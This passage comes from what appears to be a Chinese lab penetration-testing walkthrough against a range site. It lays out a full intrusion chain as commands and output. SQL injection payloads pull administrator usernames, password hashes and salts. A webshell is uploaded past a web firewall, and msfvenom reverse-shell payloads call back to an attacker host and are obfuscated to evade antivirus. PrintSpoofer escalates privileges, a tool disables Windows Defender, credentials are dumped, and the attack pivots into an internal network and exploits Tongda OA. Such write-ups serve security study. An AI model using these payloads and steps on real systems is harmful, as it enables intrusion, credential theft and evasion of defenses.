<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?UnLock=sdfe&#x27;&amp;UserNameCollection=test&#x27;)and ~1=(select top 1 username  from [msmoonlab].[msmoonlab].[bairong_Administrator]); --</span><br></pre></td></tr></table></figure>
<h4 id="查询密码"><a class="markdownIt-Anchor" href="#查询密码"></a> 查询密码</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?UnLock=sdfe&#x27;&amp;UserNameCollection=test&#x27;)and ~1=(select top 1 password from [msmoonlab].[msmoonlab].[bairong_Administrator]); --</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/04/10/alN7PuD2sYLAiw5.png" alt="image-20220125154221108" /></p>
<p>密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">64Cic1ERUP9n2OzxuKl9Tw==</span><br></pre></td></tr></table></figure>
<h4 id="查询加密方式"><a class="markdownIt-Anchor" href="#查询加密方式"></a> 查询加密方式</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?UnLock=sdfe&#x27;&amp;UserNameCollection=test&#x27;)and ~1=(select top 1 PasswordFormat from [msmoonlab].[msmoonlab].[bairong_Administrator]); --</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/05/18/nxs5dc7wlypLPh6.png" alt="image-20220125154523601" /></p>
<p>加密方式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Encrypted</span><br></pre></td></tr></table></figure>
<p>查询加密盐值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?UnLock=sdfe&#x27;&amp;UserNameCollection=test&#x27;)and ~1=(select top 1 [PasswordSalt] from [msmoonlab].[msmoonlab].[bairong_Administrator]); --</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/04/10/5MSRZyUFAEr6nu4.png" alt="image-20220125154633952" /></p>
<p>盐值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LIywB/zHFDTuEA1LU53Opg==</span><br></pre></td></tr></table></figure>
<h3 id="查询加密方式-2"><a class="markdownIt-Anchor" href="#查询加密方式-2"></a> 查询加密方式</h3>
<p>源码审计</p>
<h4 id="dll反编译"><a class="markdownIt-Anchor" href="#dll反编译"></a> DLL反编译</h4>
<p><img src="https://s2.loli.net/2022/04/10/UBGiD4FmnoPbLk2.png" alt="image-20220125165359426" /></p>
<h4 id="进行全局的查找"><a class="markdownIt-Anchor" href="#进行全局的查找"></a> 进行全局的查找</h4>
<p>查找相应的加密方式、</p>
<h3 id="编写解密"><a class="markdownIt-Anchor" href="#编写解密"></a> 编写解密</h3>
<h3 id="后台找回密码漏洞"><a class="markdownIt-Anchor" href="#后台找回密码漏洞"></a> 后台找回密码漏洞</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">参考</span><br><span class="line"></span><br><span class="line">http://cn-sec.com/archives/71636.html</span><br><span class="line">https://www.cnblogs.com/peterpan0707007/p/8721094.html</span><br><span class="line">https://blog.tangwebsafe.com/2021/03/23/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%E3%80%81%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E6%BC%8F%E6%B4%9E/</span><br></pre></td></tr></table></figure>
<p>后台找回密码</p>
<p><img src="https://s2.loli.net/2022/04/10/wtjGdOik4MefXEN.png" alt="image-20220125170455265" /></p>
<h4 id="抓包"><a class="markdownIt-Anchor" href="#抓包"></a> 抓包</h4>
<p><img src="https://s2.loli.net/2022/04/10/rfBemk5yDNYSETh.png" alt="image-20220125172006028" /></p>
<p>将问题答案设置为空</p>
<p><img src="https://s2.loli.net/2022/04/10/rSXTEQ5cKMFRt6m.png" alt="image-20220125172022269" /></p>
<p>直接将后台密码带出来</p>
<h2 id="00x3-进入后台-上传shell"><a class="markdownIt-Anchor" href="#00x3-进入后台-上传shell"></a> 00x3-进入后台-上传shell</h2>
<h3 id="进入后台"><a class="markdownIt-Anchor" href="#进入后台"></a> 进入后台</h3>
<p><img src="https://s2.loli.net/2022/04/10/1rHJx2IMSpNfdgq.png" alt="image-20220125172155588" /></p>
<h3 id="查找webshell上传点"><a class="markdownIt-Anchor" href="#查找webshell上传点"></a> 查找webshell上传点</h3>
<p>刚开始在内容模块上传文件是不行的、上传的文件都会被安全狗咬死的、</p>
<p><img src="https://s2.loli.net/2022/04/10/rnvuzC4LtWwpGei.png" alt="image-20220125173729772" /></p>
<p>只能是找一些上传压缩包的地方、等到用的时候自动解压</p>
<p><img src="https://s2.loli.net/2022/04/10/z9eavkncoK4QILX.png" alt="image-20220125173823792" /></p>
<p>站点模块管理是可以的</p>
<h3 id="上传webshell"><a class="markdownIt-Anchor" href="#上传webshell"></a> 上传webshell</h3>
<p><img src="https://s2.loli.net/2022/04/10/zaOf5MbnSe9wlQV.png" alt="image-20220125174727187" /></p>
<h4 id="上传"><a class="markdownIt-Anchor" href="#上传"></a> 上传</h4>
<p><img src="https://s2.loli.net/2022/04/10/XBEcJHM18fNgr4z.png" alt="image-20220125174749918" /></p>
<p>自己不会写过狗的shell、5555555555、只能直接拿冰蝎的马试试能不能过了</p>
<h4 id="连接"><a class="markdownIt-Anchor" href="#连接"></a> 连接</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://www.moonlab.com/SiteFiles/SiteTemplates/shell/shell.aspx</span><br><span class="line">rebeyond</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/04/10/rAnImD2TxLF1WwY.png" alt="image-20220125175224996" /></p>
<p>拿下</p>
<p><img src="https://s2.loli.net/2022/04/10/JpAhd6BlMNLYkxE.png" alt="image-20220125175257652" /></p>
<p>嫖的过狗马</p>
<p><img src="https://s2.loli.net/2022/05/18/uWsfhlxVOo8TCXw.png" alt="image-20220125175418274" /></p>
<p>使用蚁剑进行连接</p>
<p><img src="https://s2.loli.net/2022/04/10/UZ7vJElXw59scKO.png" alt="image-20220125202715893" /></p>
<h2 id="00x4-信息搜集"><a class="markdownIt-Anchor" href="#00x4-信息搜集"></a> 00x4-信息搜集</h2>
<h3 id="信息搜集"><a class="markdownIt-Anchor" href="#信息搜集"></a> 信息搜集</h3>
<p>冰蝎</p>
<h4 id="主机信息"><a class="markdownIt-Anchor" href="#主机信息"></a> 主机信息</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/04/10/LRp8jowukeYHItf.png" alt="image-20220125180806913" /></p>
<h4 id="ip"><a class="markdownIt-Anchor" href="#ip"></a> ip</h4>
<p><img src="https://s2.loli.net/2022/04/10/NjJiuh4kQwITvmZ.png" alt="image-20220125201207302" /></p>
<p>两块网卡有东西</p>
<h4 id="端口"><a class="markdownIt-Anchor" href="#端口"></a> 端口</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/04/10/9yw4RISGWZYxHa1.png" alt="image-20220125211307715" /></p>
<h4 id="开启的服务"><a class="markdownIt-Anchor" href="#开启的服务"></a> 开启的服务</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net start</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/04/10/oqOICkVdRwX7ELi.png" alt="image-20220125212137705" /></p>
<h5 id="查找对我们提权有帮助或者是又阻碍的服务"><a class="markdownIt-Anchor" href="#查找对我们提权有帮助或者是又阻碍的服务"></a> 查找对我们提权有帮助或者是又阻碍的服务</h5>
<h5 id="阻碍"><a class="markdownIt-Anchor" href="#阻碍"></a> 阻碍</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">safedog    安全狗</span><br><span class="line">Defender   win自带的杀毒</span><br><span class="line">firewall   防火墙</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/04/10/ySFeOjMiA19xp8m.png" alt="image-20220125212434664" /></p>
<h5 id="帮助"><a class="markdownIt-Anchor" href="#帮助"></a> 帮助</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MySQL   提权</span><br><span class="line">SQLserver 提权</span><br><span class="line">Print Spooler   打印机服务提权</span><br></pre></td></tr></table></figure>
<h4 id="开启的进程"><a class="markdownIt-Anchor" href="#开启的进程"></a> 开启的进程</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/04/10/YtQ3g5xa7c9nBiF.png" alt="image-20220125212821464" /></p>
<h5 id="防护进程"><a class="markdownIt-Anchor" href="#防护进程"></a> 防护进程</h5>
<p><img src="https://s2.loli.net/2022/04/10/zR9IJqscov3heWG.png" alt="image-20220125213238721" /></p>
<h4 id="查看用户信息"><a class="markdownIt-Anchor" href="#查看用户信息"></a> 查看用户信息</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /all</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/04/10/pAy3BYDhV4n7XGS.png" alt="image-20220125212911711" /></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SeImpersonatePrivilege        身份验证后模拟客户端 已启用      这个服务能够帮助我们提权</span><br></pre></td></tr></table></figure>
<h3 id="上msf"><a class="markdownIt-Anchor" href="#上msf"></a> 上MSF</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 9090</span><br><span class="line">show options</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/04/10/e2ZBRyKqfVvcHu9.png" alt="" /></p>
<h4 id="连接-2"><a class="markdownIt-Anchor" href="#连接-2"></a> 连接</h4>
<p><img src="https://s2.loli.net/2022/04/10/zFvdTDfrBqyECx9.png" alt="image-20220125202457889" /></p>
<h4 id="做个隧道"><a class="markdownIt-Anchor" href="#做个隧道"></a> 做个隧道</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">添加路由：</span><br><span class="line"></span><br><span class="line">查看全局路由器</span><br><span class="line">run get_local_subnets</span><br><span class="line">添加10段的路由信息</span><br><span class="line">run autoroute -s 10.10.1.0/24</span><br><span class="line">查看添加的路由表信息</span><br><span class="line">run autoroute -p</span><br><span class="line"></span><br><span class="line">添加代理</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">show options</span><br><span class="line">设置代理</span><br><span class="line">set SRVPORT 5555</span><br><span class="line">run</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="测试"><a class="markdownIt-Anchor" href="#测试"></a> 测试</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 curl 10.10.1.130</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/04/10/wdFMer7iKCkltuZ.png" alt="image-20220125203629620" /></p>
<h3 id="msf转到cs"><a class="markdownIt-Anchor" href="#msf转到cs"></a> MSF转到CS</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">先将msf上获得的session放到后台运行</span><br><span class="line">background</span><br><span class="line">然后使用 exploit/windows/local/payload_inject来注入一个新的payload到session中</span><br><span class="line"></span><br><span class="line">设置新的payload</span><br><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set LHOST 192.168.1.130    //cs主机地址</span><br><span class="line">set LPORT 6060    //随意设置监听端口，需要和cs保持一致</span><br><span class="line">set session 1    //设置需要派送的meterpreter</span><br><span class="line">set DisablePayloadHandler true    //禁止产生一个新的handler</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/04/10/qC63EUsQyue8ox5.png" alt="image-20220125205834122" /></p>
<h2 id="00x5-windows-server-2016漏洞提权"><a class="markdownIt-Anchor" href="#00x5-windows-server-2016漏洞提权"></a> 00x5-Windows server-2016漏洞提权</h2>
<p>上面的防护软件我们已经清楚了、对于我们能过够利用提权的一些进程我们也已经查看了</p>
<h3 id="搜索相关提权方法"><a class="markdownIt-Anchor" href="#搜索相关提权方法"></a> 搜索相关提权方法</h3>
<p><img src="https://s2.loli.net/2022/04/10/7vYUsw8kGa6lZhV.png" alt="" /></p>
<p>我们可以利用的poc还是挺多的、但是安全狗的免杀也是很重要的</p>
<p>这里我们使用的是Windows的打印机漏洞、这个漏洞在20、21年都一直在爆0day</p>
<p><img src="https://s2.loli.net/2022/04/10/XVE7zLuYwfZvq81.png" alt="image-20220125225105160" /></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">参考</span><br><span class="line">https://www.cnblogs.com/trevain/p/13672443.html</span><br><span class="line">http://caidaome.com/?post=285</span><br></pre></td></tr></table></figure>
<h4 id="免杀"><a class="markdownIt-Anchor" href="#免杀"></a> 免杀</h4>
<p><img src="https://s2.loli.net/2022/04/10/J512iFsjMaStxBh.png" alt="image-20220125225132660" /></p>
<p>上面介绍的都是使用dll动态链接库来做反弹的、但是这种上传上去就会被安全狗杀</p>
<p>这里使用上面的Print Spooler免杀</p>
<h3 id="上传poc"><a class="markdownIt-Anchor" href="#上传poc"></a> 上传poc</h3>
<p>这里我们得到的shell的用户权限是很小的、打开的终端也是不能查看文件切换目录的、所以我们在上传文件的时候要注意上传到最小用户也能读能执行的目录下、和Linux一样需要上传到Temp目录</p>
<p><img src="https://s2.loli.net/2022/04/10/7uQ1tAnGFhqNaTv.png" alt="" /></p>
<h3 id="执行"><a class="markdownIt-Anchor" href="#执行"></a> 执行</h3>
<p><img src="https://s2.loli.net/2022/04/10/viMNcPSs4TRnLFD.png" alt="image-20220125232545691" /></p>
<p>查看权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printspoofer1.exe -i -c &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/04/10/RMhKgin4VSNjJ8p.png" alt="image-20220125232803649" /></p>
<p>通过poc我们可以是system权限、但是没有办法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用教程</span><br><span class="line">https://github.com/itm4n/PrintSpoofer</span><br></pre></td></tr></table></figure>
<p>我们使用poc开一个system权限的cmd进程、考虑在使用cs注入一个system的smb通道</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PrintSpoofer.exe -i -c cmd</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/04/10/FYpW6rNiuIzZtJy.png" alt="image-20220125235049603" /></p>
<p>但是在cs上却不行</p>
<p><img src="https://s2.loli.net/2022/04/10/IbWshNrXV6ce1lv.png" alt="image-20220125235144615" /></p>
<p>这种进程是用不了的</p>
<h3 id="制作免杀攻击载荷"><a class="markdownIt-Anchor" href="#制作免杀攻击载荷"></a> 制作免杀攻击载荷</h3>
<h4 id="先制作反向代理的攻击载荷"><a class="markdownIt-Anchor" href="#先制作反向代理的攻击载荷"></a> 先制作反向代理的攻击载荷</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.130 LPORT=6061 -e x86/shikata_ga_nai -i 20 -f c -o payload3.c</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/04/10/M25SGFB6u793TrI.png" alt="image-20220126001852866" /></p>
<h4 id="msf设置监听"><a class="markdownIt-Anchor" href="#msf设置监听"></a> MSF设置监听</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 6061</span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure>
<h4 id="攻击载荷进行shellcode编译"><a class="markdownIt-Anchor" href="#攻击载荷进行shellcode编译"></a> 攻击载荷进行shellcode编译</h4>
<h5 id="使用到的工具掩目"><a class="markdownIt-Anchor" href="#使用到的工具掩目"></a> 使用到的工具掩目</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">工具地址</span><br><span class="line">https://github.com/1y0n/AV_Evasion_Tool</span><br></pre></td></tr></table></figure>
<h5 id="编译"><a class="markdownIt-Anchor" href="#编译"></a> 编译</h5>
<p><img src="https://s2.loli.net/2022/04/10/3qvj58a9Im6HYoL.png" alt="image-20220126115127555" /></p>
<h5 id="生成免杀"><a class="markdownIt-Anchor" href="#生成免杀"></a> 生成免杀</h5>
<p><img src="https://s2.loli.net/2022/04/10/FBlmcXvZ5uhCEL7.png" alt="image-20220126115324476" /></p>
<h4 id="上传-2"><a class="markdownIt-Anchor" href="#上传-2"></a> 上传</h4>
<p><img src="https://s2.loli.net/2022/04/10/nFXl1hcIQ6GwpdB.png" alt="image-20220126115502547" /></p>
<h4 id="结果被windows杀软查杀"><a class="markdownIt-Anchor" href="#结果被windows杀软查杀"></a> 结果被windows杀软查杀</h4>
<p><img src="https://s2.loli.net/2022/04/10/Zs9rRtPi43kBGmO.png" alt="" /></p>
<h4 id="斗智斗勇阶段"><a class="markdownIt-Anchor" href="#斗智斗勇阶段"></a> 斗智斗勇阶段</h4>
<p>被windows的杀软直接给杀了</p>
<p>然后使用掩目就不断的尝试变换shell一直都是不行的</p>
<p>中间又经过了两个小时</p>
<p>灵光一现</p>
<p>既然我们绕过不杀软、为何不直接将他杀了</p>
<p>开始想办法</p>
<h4 id="终于功夫不负有心人"><a class="markdownIt-Anchor" href="#终于功夫不负有心人"></a> 终于功夫不负有心人</h4>
<p>大佬就20小时前刚写的工具</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/APTortellini/DefenderSwitch</span><br></pre></td></tr></table></figure>
<p>直接上</p>
<p>我们先利用打印机漏洞获取一个system的cmd</p>
<p><img src="https://s2.loli.net/2022/04/10/BjkmAPq2cnSLiup.png" alt="image-20220126171729983" /></p>
<h3 id="工具上传"><a class="markdownIt-Anchor" href="#工具上传"></a> 工具上传</h3>
<p><img src="https://s2.loli.net/2022/04/10/pxB7kSbNs9yutRH.png" alt="image-20220126171831437" /></p>
<h4 id="执行-2"><a class="markdownIt-Anchor" href="#执行-2"></a> 执行</h4>
<p><img src="https://s2.loli.net/2022/04/10/5OB8KDHP2C7pE1a.png" alt="image-20220126171841229" /></p>
<p>牛蛙牛蛙</p>
<p>直接关闭了Windows Defender Service</p>
<h3 id="再次上传攻击载荷"><a class="markdownIt-Anchor" href="#再次上传攻击载荷"></a> 再次上传攻击载荷</h3>
<p>再次上传我们msfvenom生成的攻击载荷</p>
<p>再次经过掩目做免杀、生成exe</p>
<p>上传</p>
<p><img src="https://s2.loli.net/2022/04/10/C97nREdbwa6WVsl.png" alt="image-20220126172003452" /></p>
<h4 id="上传成功"><a class="markdownIt-Anchor" href="#上传成功"></a> 上传成功</h4>
<p><img src="https://s2.loli.net/2022/04/10/WNuVDSTi7H1cYqA.png" alt="image-20220126172052933" /></p>
<p>Defender终于闭嘴了、狗哥也没有反应</p>
<h4 id="执行exe"><a class="markdownIt-Anchor" href="#执行exe"></a> 执行exe</h4>
<p><img src="https://s2.loli.net/2022/04/10/uq9EmvtWaLIGPNn.png" alt="image-20220126172134521" /></p>
<h3 id="成功反弹session会话"><a class="markdownIt-Anchor" href="#成功反弹session会话"></a> 成功反弹session会话</h3>
<p>system权限</p>
<p><img src="https://s2.loli.net/2022/04/10/ahtSQqB1rZ4fR7d.png" alt="image-20220126172218725" /></p>
<h4 id="注入系统进程"><a class="markdownIt-Anchor" href="#注入系统进程"></a> 注入系统进程</h4>
<p>注入一个administrator的进程</p>
<p><img src="https://s2.loli.net/2022/04/10/FPDsoeQun8wIXkY.png" alt="" /></p>
<p>在注入一个system的进程</p>
<p><img src="https://s2.loli.net/2022/04/10/9xEaFeBoQGk3mW7.png" alt="image-20220126220128306" /></p>
<h3 id="转到cs"><a class="markdownIt-Anchor" href="#转到cs"></a> 转到CS</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">先将msf上获得的session放到后台运行</span><br><span class="line">background</span><br><span class="line">然后使用 exploit/windows/local/payload_inject来注入一个新的payload到session中</span><br><span class="line"></span><br><span class="line">设置新的payload</span><br><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set LHOST 192.168.1.130    //cs主机地址</span><br><span class="line">set LPORT 6060    //随意设置监听端口，需要和cs保持一致</span><br><span class="line">set session 1    //设置需要派送的meterpreter</span><br><span class="line">set DisablePayloadHandler true    //禁止产生一个新的handler</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/04/10/OBTtV8DpgyaiRzI.png" alt="image-20220126172533834" /></p>
<h4 id="cs上线"><a class="markdownIt-Anchor" href="#cs上线"></a> cs上线</h4>
<p><img src="https://s2.loli.net/2022/04/10/zPakQ34JvbH5wFs.png" alt="image-20220126172611832" /></p>
<h4 id="转移进程"><a class="markdownIt-Anchor" href="#转移进程"></a> 转移进程</h4>
<p><img src="https://s2.loli.net/2022/04/10/TOj2k5n3BCaYSbZ.png" alt="image-20220126173822882" /></p>
<h2 id="00x6-踏进内网"><a class="markdownIt-Anchor" href="#00x6-踏进内网"></a> 00x6-踏进内网</h2>
<p>上面我们已经拿到了外网机器的adminstrstor的用户权限</p>
<h3 id="对内网进行信息搜集"><a class="markdownIt-Anchor" href="#对内网进行信息搜集"></a> 对内网进行信息搜集</h3>
<h4 id="密码获取"><a class="markdownIt-Anchor" href="#密码获取"></a> 密码获取</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hashdump</span><br><span class="line">logonpasswords</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/04/10/cpCPQBHNlxJ571k.png" alt="image-20220126195111249" /></p>
<p>上面我们已经知道这个目标机是开启了3389端口的、</p>
<h4 id="连接3389"><a class="markdownIt-Anchor" href="#连接3389"></a> 连接3389</h4>
<h5 id="小插曲-2"><a class="markdownIt-Anchor" href="#小插曲-2"></a> 小插曲</h5>
<p><img src="https://s2.loli.net/2022/04/10/LJ4FzNVHsUpTtqP.png" alt="image-20220126212832048" /></p>
<p>如果连接Windows server 2016出现这个报错</p>
<h5 id="解决"><a class="markdownIt-Anchor" href="#解决"></a> 解决</h5>
<p><img src="https://s2.loli.net/2022/04/10/PTpS83hF4I1gbYA.png" alt="image-20220126213003163" /></p>
<h5 id="连接-3"><a class="markdownIt-Anchor" href="#连接-3"></a> 连接</h5>
<p><img src="https://s2.loli.net/2022/04/10/vIS7ezUgBAPujDi.png" alt="image-20220126213340788" /></p>
<h5 id="成功"><a class="markdownIt-Anchor" href="#成功"></a> 成功</h5>
<p><img src="https://s2.loli.net/2022/04/10/hqKNw9SIXfQvYpc.png" alt="image-20220126213433819" /></p>
<h5 id="任务"><a class="markdownIt-Anchor" href="#任务"></a> 任务</h5>
<p>清除痕迹、关闭安全狗、Windows Defeder在前面我们已经完全的关闭了</p>
<h3 id="跨网段信息搜集"><a class="markdownIt-Anchor" href="#跨网段信息搜集"></a> 跨网段信息搜集</h3>
<p>查看arp信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp -a</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/04/10/SoVYCiBU62HOwE8.png" alt="image-20220126223914648" /></p>
<h4 id="内网扫描"><a class="markdownIt-Anchor" href="#内网扫描"></a> 内网扫描</h4>
<h5 id="内网ip扫描"><a class="markdownIt-Anchor" href="#内网ip扫描"></a> 内网IP扫描</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这里使用的是目标机1的隧道进行扫描的、不建议使用在本机代理使用nmap、太慢了</span><br><span class="line">run arp_scanner -r 10.10.1.0/24</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/04/10/y76jwDqLav1g5SE.png" alt="image-20220127000047923" /></p>
<p>确定只有两个ip10.10.1.130与本机的10.10.1.131</p>
<h5 id="端口扫描-2"><a class="markdownIt-Anchor" href="#端口扫描-2"></a> 端口扫描</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 sudo masscan -p 1-65535 10.10.1.130 --rate=500</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/04/10/6a37IqwD1ieJSvr.png" alt="image-20220126232722137" /></p>
<h5 id="访问80端口"><a class="markdownIt-Anchor" href="#访问80端口"></a> 访问80端口</h5>
<p><img src="https://s2.loli.net/2022/04/10/i25ZEkNOFAJtHrP.png" alt="bec992998d582e0f6c394de9117e443" /></p>
<p>通达OA</p>
<h2 id="00x7-进入内网发现域控"><a class="markdownIt-Anchor" href="#00x7-进入内网发现域控"></a> 00x7-进入内网发现域控</h2>
<h3 id="通达oa-getshell-拿下目标机2"><a class="markdownIt-Anchor" href="#通达oa-getshell-拿下目标机2"></a> 通达OA-getshell-拿下目标机2</h3>
<p>上面我们发现的通达OA</p>
<h4 id="直接使用工具-通达oa"><a class="markdownIt-Anchor" href="#直接使用工具-通达oa"></a> 直接使用工具-通达OA</h4>
<p><img src="https://s2.loli.net/2022/04/10/vekWRJTCpOM5lXx.png" alt="image-20220126233525268" /></p>
<h4 id="直接打通"><a class="markdownIt-Anchor" href="#直接打通"></a> 直接打通</h4>
<p><img src="https://s2.loli.net/2022/04/10/nS8O5Z31JvGRcXV.png" alt="image-20220126233547407" /></p>
<h4 id="上传冰蝎马"><a class="markdownIt-Anchor" href="#上传冰蝎马"></a> 上传冰蝎马</h4>
<h5 id="上传-3"><a class="markdownIt-Anchor" href="#上传-3"></a> 上传</h5>
<p><img src="https://s2.loli.net/2022/04/10/dkYDgN8sqapnBRe.png" alt="image-20220126234000212" /></p>
<h5 id="连接-4"><a class="markdownIt-Anchor" href="#连接-4"></a> 连接</h5>
<p><img src="https://s2.loli.net/2022/05/18/6v7fZFcUsPhguTy.png" alt="image-20220126234122149" /></p>
<h5 id="查看权限"><a class="markdownIt-Anchor" href="#查看权限"></a> 查看权限</h5>
<p><img src="https://s2.loli.net/2022/05/18/aK9e3YqosSJ5Mrk.png" alt="image-20220126234708643" /></p>
<h5 id="查看进程"><a class="markdownIt-Anchor" href="#查看进程"></a> 查看进程</h5>
<p><img src="https://s2.loli.net/2022/05/18/BUgV3S1oT4bYKN7.png" alt="image-20220127001627115" /></p>
